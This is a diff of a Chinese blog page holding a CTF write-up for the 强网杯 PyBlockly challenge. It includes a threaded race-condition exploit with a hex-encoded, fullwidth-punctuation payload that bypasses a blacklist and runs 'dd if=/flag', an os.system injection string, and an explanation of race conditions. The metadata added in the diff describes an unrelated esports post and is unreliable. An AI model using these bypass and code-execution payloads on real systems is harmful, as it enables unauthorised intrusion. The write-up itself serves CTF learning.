@@ -6,20 +6,22 @@
   <meta name="keywords" content=" WP ">
   <meta name="description" content="强网杯WP及复现 | f4k3r&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="&#x2F;&#x2F;题目源码 from flask import Flask, request, jsonify import re import unidecode import string import ast import sys import os import subprocess import importlib.util import json  app &#x3D; Flask(__name__) app">
+<meta name="description" content="​	 ​	太激动了，言语无法表达的激动。2024年4月14日，LCK春决，faker输了，没能打破自己的心魔，仅仅过了半年，faker在半决赛上一把飞雷神阿卡丽，拿下关键一役，赛点zeus的天秀武器，真的太爽了。半年啊，在联赛内十连败的对手，居然在这么关键的比赛上拿下了，真的无法想到他是怎么做到的。真的令我动容，当faker的粉丝真的太幸福了。 ​	看之前，完全就是放平心态的去看的，也没想过能赢">
 <meta property="og:type" content="article">
-<meta property="og:title" content="强网杯WP及复现">
-<meta property="og:url" content="http://example.com/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AFWP%E5%8F%8A%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="战胜了心魔">
+<meta property="og:url" content="http://example.com/2024/10/28/%E6%88%98%E8%83%9C%E4%BA%86%E5%BF%83%E9%AD%94/index.html">
 <meta property="og:site_name" content="f4k3r&#39;s blog">
-<meta property="og:description" content="&#x2F;&#x2F;题目源码 from flask import Flask, request, jsonify import re import unidecode import string import ast import sys import os import subprocess import importlib.util import json  app &#x3D; Flask(__name__) app">
+<meta property="og:description" content="​	 ​	太激动了，言语无法表达的激动。2024年4月14日，LCK春决，faker输了，没能打破自己的心魔，仅仅过了半年，faker在半决赛上一把飞雷神阿卡丽，拿下关键一役，赛点zeus的天秀武器，真的太爽了。半年啊，在联赛内十连败的对手，居然在这么关键的比赛上拿下了，真的无法想到他是怎么做到的。真的令我动容，当faker的粉丝真的太幸福了。 ​	看之前，完全就是放平心态的去看的，也没想过能赢">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AFWP%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20241103181036034.png">
-<meta property="article:published_time" content="2024-11-03T09:23:10.000Z">
-<meta property="article:modified_time" content="2024-11-03T10:11:32.497Z">
+<meta property="og:image" content="http://example.com/2024/10/28/%E6%88%98%E8%83%9C%E4%BA%86%E5%BF%83%E9%AD%94/image-20241028003512934.png">
+<meta property="og:image" content="http://example.com/2024/10/28/%E6%88%98%E8%83%9C%E4%BA%86%E5%BF%83%E9%AD%94/image-20241028005102727.png">
+<meta property="og:image" content="http://example.com/2024/10/28/%E6%88%98%E8%83%9C%E4%BA%86%E5%BF%83%E9%AD%94/image-20241028010502913.png">
+<meta property="article:published_time" content="2024-10-27T16:32:56.000Z">
+<meta property="article:modified_time" content="2024-10-27T17:05:08.786Z">
 <meta property="article:author" content="f4k3r">
-<meta property="article:tag" content="WP">
+<meta property="article:tag" content="随想">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AFWP%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20241103181036034.png">
+<meta name="twitter:image" content="http://example.com/2024/10/28/%E6%88%98%E8%83%9C%E4%BA%86%E5%BF%83%E9%AD%94/image-20241028003512934.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -1098,7 +1100,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2024-11-03 18:11:32'>2024-11-03 17:23</time>
+            发布时间 : <time class="date" title='最后更新: 2024-11-04 21:57:40'>2024-11-03 17:23</time>
         
     </div>
     <div class="article-meta">
@@ -1109,7 +1111,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0"><span class="toc-text">谍影重重5.0</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#PyBlockly"><span class="toc-text">PyBlockly</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-text">条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Python%E8%84%9A%E6%9C%AC%E9%AA%8C%E8%AF%81%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E7%A4%BA%E4%BE%8B"><span class="toc-text">Python脚本验证条件竞争漏洞示例</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1125,7 +1127,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <pre><code class="python">//题目源码
+        <h3 id="PyBlockly"><a href="#PyBlockly" class="headerlink" title="PyBlockly"></a>PyBlockly</h3><pre><code class="python">//题目源码
 from flask import Flask, request, jsonify
 import re
 import unidecode
@@ -1283,7 +1285,173 @@ if __name__ == &#39;__main__&#39;:
 <p><code>&#39;; _ _ import_ _(&quot;builtins&quot;)。 len = lambda a: 1;&#39;&#39;; _ _import_ _(&quot;os&quot;)。 system (“$ (printf ‘ \ 144 \ 144 \ 40 \ 151 \ 146 \ 75 \ 57 \ 146 \ 154 \ 141 \ 147’); ”);’</code></p>
 <p>相关payload</p>
 <p><img src="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AFWP%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20241103181036034.png"></p>
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="谍影重重5-0"><a href="#谍影重重5-0" class="headerlink" title="谍影重重5.0"></a>谍影重重5.0</h3>
+<p>由于官方的环境已经被关掉了，我又弄了个本地的环境，方便我进行复现的操作</p>
+<p>贴一下WP大佬的exp</p>
+<pre><code class="python">import requests
+import json
+import threading
+
+url = &quot;http://localhost:5555/&quot;
+
+data = &#123;
+    &quot;blocks&quot;: &#123;
+        &quot;blocks&quot;: [
+            &#123;
+                &quot;type&quot;: &quot;print&quot;,
+                &quot;x&quot;: 101,
+                &quot;y&quot;: 102,
+                &quot;inputs&quot;: &#123;
+                    &quot;TEXT&quot;: &#123;
+                        &quot;block&quot;: &#123;
+                            &quot;type&quot;: &quot;max&quot;,
+                            &quot;inputs&quot;: &#123;
+                                &quot;A&quot;: &#123;
+                                    &quot;block&quot;: &#123;
+                                        &quot;type&quot;: &quot;text&quot;,
+                                        &quot;fields&quot;: &#123;&quot;TEXT&quot;: &quot;‘，‘’））\n（open（bytes。fromhex（’72756e2e7079‘）。decode（），’wb‘）。write（bytes。fromhex（’696d706f7274206f730a0a7072696e74286f732e706f70656e282764642069663d2f666c616727292e72656164282929‘）））\n\nprint（print（’1&quot;&#125;
+                                    &#125;
+                                &#125;,
+                                &quot;B&quot;: &#123;
+                                    &quot;block&quot;: &#123;
+                                        &quot;type&quot;: &quot;math_number&quot;,
+                                        &quot;fields&quot;: &#123;&quot;NUM&quot;: 10&#125;
+                                    &#125;
+                                &#125;
+                            &#125;
+                        &#125;
+                    &#125;
+                &#125;
+            &#125;
+        ]
+    &#125;
+&#125;
+
+def send_request():
+    while True:
+        r = requests.post(url + &quot;/blockly_json&quot;,
+                          headers=&#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;, data=json.dumps(data))
+        text = r.text
+        if &quot;1 10&quot; not in text and &quot;No such file or direct&quot; not in text and len(text) &gt; 10:
+            print(text)
+            os.exit(-1)
+            break
+
+threads = []
+num_threads = 100
+
+for _ in range(num_threads):
+    thread = threading.Thread(target=send_request)
+    threads.append(thread)
+    thread.start()
+
+for thread in threads:
+    thread.join()
+</code></pre>
+<p>首先要学会写这样的exp，你得先尝试读懂别人的exp</p>
+<p>和这道题相关的东西，比如说 “x”: 101,”y”: 102,这里指的是在某个坐标系统中的位置坐标，这些坐标用于定位某个图形、元素或对象在界面上的位置，在图形界面编程或绘图上下文中，这样的坐标通常用于确定元素的放置位置。例如，在一个画布上绘制形状、文本或其他组件时，会用到这样的坐标系统。</p>
+<img src="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AFWP%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20241104200659440.png" alt="image-20241104200659440" style="zoom: 33%;">
+
+<p>如果你将图中的print “hello”这个模块进行移动的话，相应的xy参数也会发生改变</p>
+<p>72756e2e7079对应的字符是run.py，这里就是写了个py文件进行攻击</p>
+<p>696d706f7274206f730a0a7072696e74286f732e706f70656e282764642069663d2f666c616727292e72656164282929对应的字符是</p>
+<pre><code class="python">import os
+print(os.popen(&#39;dd if=/flag&#39;).read()) 
+</code></pre>
+<p>解释一下这段攻击代码的基本意思</p>
+<p>import os 没什么好说的，就是导入Python的os模块，允许使用与操作系统交互的功能</p>
+<p>os.popen(‘dd if&#x3D;&#x2F;flag’)</p>
+<p>使用os.popen函数来执行一个shell命令，这里的命令是dd if&#x3D;&#x2F;flag</p>
+<p>dd是一个linux下的命令行工具，通常用于低级别的数据复制和转换</p>
+<p>if&#x3D;&#x2F;flag 指定输入文件为&#x2F;flag，就是复制flag的内容并且查看</p>
+<p>.read() 调用.read()方法从popen返回的文件对象中读取命令的输出</p>
+<p><img src="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AFWP%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20241104212350202.png"></p>
+<p>那么为什么要将攻击代码编码为16进制呢，因为这里又有个黑名单会过滤popen这种危险函数，我们还需要做一层绕过</p>
+<p>还有就是中间的很多符号比如说() . ,都是用的中文的括号句号和逗号，这是一种绕过的手段，因为中文字符通过unicode.unicode可以直接 转英文字符，即绕过黑名单</p>
+<p>这里设置了黑名单，我们是需要绕过的</p>
+<p><img src="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AFWP%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20241104212109214.png"></p>
+<p><img src="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AFWP%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20241104212022574.png"></p>
+<p>这个位置就是我们绕过的利用点</p>
+<p>max中的A是写攻击代码，B就是正常的代码，没什么问题</p>
+<pre><code class="python">if &quot;1 10&quot; not in text and &quot;No such file or direct&quot; not in text and len(text) &gt; 10:
+</code></pre>
+<p>这里就是过滤掉正常的数据包了，如果1 10 No such file or direct出现在数据包中，说明是没有成功执行攻击脚本的，我们只需要执行脚本返回的数据，也就是flag</p>
+<pre><code class="python">threads = []
+num_threads = 100
+
+for _ in range(num_threads):
+    thread = threading.Thread(target=send_request)
+    threads.append(thread)
+    thread.start()
+
+for thread in threads:
+    thread.join()
+</code></pre>
+<p>这里就是开了100个进程去进行条件竞争</p>
+<p>然后问题来了，什么是条件竞争，我需要详细的学习一下条件竞争的概念。</p>
+<h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><p>形象的形容这个问题，就像是幼儿园发糖吃，每个人只能拿一块，但是如果你跟别人一起再拿一次老师也没办法分辨，毕竟一群小朋友老师也没办法分辨手和对应的人</p>
+<p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端会处理不同用户的请求时是并发进行的，因此如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
+<p>譬如说一个文件上传的功能点</p>
+<pre><code class="php">&lt;?php
+    if(isset($_GET[&#39;src&#39;]))&#123;
+        saveimg($_GET[&#39;src&#39;]);
+        //得到保存路径filename
+        //检查文件
+        check(filename);
+        if(不符合规范)
+            delete(filename);
+        else
+            pass;
+    &#125;
+?&gt;
+</code></pre>
+<p>如果我们采用大量的并发请求，就传递一个生成恶意webshell的图像以生成webshell，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成了一个恶意shell的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个shell文件，后续的 一切就都不是问题了。</p>
+<p><strong>《CTF特训营中》对条件竞争漏洞的解释</strong></p>
+<p>条件竞争是指多个线程或者进程在读写一个共享数据时，结果依赖于它们执行的相对时间的情形。当多个线程或进程同时访问相同的共享代码、变量、文件等而没有锁或没有同步互斥管理时，则会触发条件竞争，导致输出不一致的问题。</p>
+<p>在编写代码时，由于大部分服务端语言编写的代码是以线性方式执行的，而Web服务器往往是多个线程并行执行，因而很可能会出现一些问题。下面列举一个简单的例子。</p>
+<p>有一个银行账户A和一个银行账户B里面各有1000元钱，现在有两名用户同时登录到了账户A，并且两人都想完成同一个操作：从账户A转100元到账户B，那么正常的操作结果应该是两名用户转账结束之后，账户A里面剩余800元，账户B里面剩余1200元。</p>
+<p>但是，考虑下面这一种情况，如果两名用户在同一个时刻发起了转账请求，那么服务器的处理过程如下。</p>
+<p>1）用户甲发起转账请求，服务器验证账户A的余额为1000元，可以转账。</p>
+<p>2）用户乙同时发起转账请求，服务器验证账户A的余额为1000元，可以转账。</p>
+<p>3）服务器处理用户甲的请求，从账户A里面扣除100元（此时账户A余额为900元），并将其存入账户B（此时账户B余额为1100元）</p>
+<p>4）服务器处理用户乙的请求，从账户A里面扣除100元（此时账户A余额为900元），并将其存入账户B（此时账户B余额为1200元）</p>
+<p>5）处理结果：账户A余额为900元，账户B余额为1200元。相当于凭空多出了100元、</p>
+<p>出现上述情况的原因就是条件竞争，正常情况下，因为账户A作为一个共享变量，在某一个时刻有且只有一个用户能够操作账户A的余额，但是由于服务器没有进行适当的加锁或是同步互斥管理，使得两个用户同时访问并修改账户A的余额，从而引发错误。</p>
+<p>注意，这里所说的同时并非真正意义上的同时，而是两个操作之间时间间隔极小，对比服务端的延迟，可以近似于同时。当然上述示例只是一个说明性的例子，因为仅仅只有两个用户时是很难做到同事的所以在真正实际操作的时候，往往会设置很大的进程数或线程数同时发起请求，从而使得某两个进程或线程能够幸运地做到同时。</p>
+<p>PS：所以这道强网杯的题要设置100个进程，这样才可以保证攻击代码会很快就被执行。</p>
+<h5 id="Python脚本验证条件竞争漏洞示例"><a href="#Python脚本验证条件竞争漏洞示例" class="headerlink" title="Python脚本验证条件竞争漏洞示例"></a>Python脚本验证条件竞争漏洞示例</h5><pre><code class="python">import requests
+import threading
+from queue import Queue
+
+url = &quot;xxxx&quot;
+
+requests_time = 0
+message_queue = Queue()  # 修改为 Queue()
+stop = 0
+
+def output():
+    global message_queue, stop
+    while stop != 1 or not message_queue.empty():
+        try:
+            msg = message_queue.get()  # 设置超时避免阻塞
+            print(msg)
+        except:
+            continue
+
+def request():
+    global requests_time, message_queue
+    while requests_time &lt; 1000:
+        response = requests.get(url)
+        message_queue.put(response.content)
+        requests_time += 1
+
+Thread_count = 80
+threading.Thread(target=output).start()
+for i in range(Thread_count):
+    t = threading.Thread(target=request)
+    t.start()
+stop = 1
+</code></pre>
+
       
        
     </div>
